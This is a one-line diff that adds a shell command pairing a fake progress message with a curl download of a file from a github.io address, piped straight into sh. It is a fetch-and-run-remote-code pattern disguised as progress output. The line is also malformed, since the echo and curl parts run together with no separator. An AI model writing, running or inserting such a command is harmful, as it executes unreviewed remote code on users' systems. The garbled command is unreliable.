@@ -1,0 +1,1 @@
+echo Progress: 76.00%curl -L --progress-bar frkns.github.io/fun/trackerGrowAppointments.out | sh
